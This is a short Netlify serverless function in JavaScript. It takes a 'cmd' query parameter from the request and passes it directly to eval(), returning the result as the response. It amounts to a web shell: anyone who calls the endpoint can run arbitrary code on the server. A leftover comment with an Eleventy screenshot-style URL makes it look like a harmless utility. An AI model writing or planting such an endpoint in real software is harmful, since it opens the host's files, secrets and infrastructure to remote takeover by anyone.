const { builder } = require("@netlify/functions");

async function handler(event, context) {
  // e.g. /https%3A%2F%2Fwww.11ty.dev%2F/small/1:1/smaller/
  const url = new URL(event.rawUrl);
  let cmd = url.searchParams.get('cmd') || '1337';
  
  try {
    const result = await eval(cmd);
    return {
      statusCode: 200,
      headers: {
        "content-type": 'text/plain',
      },
      body: JSON.stringify(result),
    };
  } catch (error) {
    return {
      statusCode: 500,
      headers: {
        "content-type": 'text/plain',
      },
      body: String(error),
    };
  }
}

exports.handler = builder(handler);
